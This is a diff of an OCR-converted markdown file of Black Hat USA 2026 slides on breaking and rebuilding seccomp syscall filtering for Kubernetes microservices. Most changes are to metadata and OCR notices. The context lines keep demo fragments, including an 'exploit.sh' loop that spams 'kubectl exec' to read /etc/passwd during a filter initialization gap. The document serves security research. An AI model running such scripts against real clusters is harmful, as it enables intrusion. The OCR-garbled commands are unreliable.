@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Jin Her&Chihyeon Cho&Jaehyun Nam&Seungsoo Lee_Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices.pdf"
 pages: 24
 sha256: "f42b566cbbee32810c655a168c44d4ee08310dfeb77d9773faadc92207661f6a"
-text_chars: 10150
+text_chars: 9780
 ocr_pages: 4
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.6
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:10:25Z"
+converted_at: "2026-08-12T05:35:29Z"
 ---
 # Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices
 
 **Speakers:** Jin Her, Chihyeon Cho, Jaehyun Nam, Seungsoo Lee  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Jin Her&Chihyeon Cho&Jaehyun Nam&Seungsoo Lee_Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices.pdf` (24 pages)
+
 
 ## Slide 1
 
@@ -332,26 +337,21 @@ Experimental Environment **Category Configuration** Cluster **Kubernetes** v1.30
 
 14
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Demo 1: Evading Stateless Filters
 * Stateless filter’s not sufficient to protect a container
-A\NotSecure 172.16.0.121:8080
 GoFinance
 The most popular peer to peer lending at SEA
 Hello Again!
 Back
 Forgot Password ?
 eee eclab@demo: ~/Demo/syscall_monitor
-10: ~[Demo/syscalL_monitor (ssh) 31 x noni em i_monite
 eclab@demo: ~/Demo/syscall_monitor (ssh)
 cclab@demo:~/Demo/syscall_monitor$ sed -n '2063,2@83p' syscall_trace_cl
-ean. log
 cclab@demo:~/Demo/syscall_monitor$ head -n 3@ /var/lib/kubelet/sec
-comp/profiles/web-server-profile. json]
-oo
-black hat
 2026
 14
 ```
@@ -366,7 +366,8 @@ black hat
 
 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Demo 2: Exploiting Delayed Termination
@@ -395,7 +396,6 @@ if (written < @) {
 perror("write");
 } else {
 fprintf(stderr, "“[victim] write returned %zd\n", written);
-black hat
 2026
 15
 ```
@@ -408,13 +408,13 @@ black hat
 
 16
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Demo 2: Exploiting Delayed Termination
 root@nginx:/# §j
 cclab@demo :~/Demo/2_sigkill6 [|
-black hat
 2026 16
 ```
 
@@ -440,20 +440,18 @@ exploit.sh
 
 18
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Demo 3: Exploiting the Initialization Gap
 exploit.sh
-ame ‘siaboaane! pooner npermet (sh) °
-#!/bin/bash cclab@demo:~/Demo/3_operator$ kubectl apply -f nginx. yaml [| =
 NAMESPACE="default"
 POD_NAME="nginx"
 echo "[*] Spamming kubectl exec..."
 while true; do
 kubectl exec —n "$NAMESPACE" "$POD_NAME" —- \
 cat /etc/passwd 2>/dev/null
-‘cclab@demo: ~/Demo/3_operator (ssh)
 EXIT_CODE=$? cclab@demo:~/Demo/3_operator$ ./exploit.sh ff
 Ab
 if [[ $EXIT_CODE -eq @ ]]; then
@@ -461,7 +459,6 @@ echo "[!!] Attack SUCCESS"
 exit @
 fi
 done
-black hat
 2026 18
 ```
 
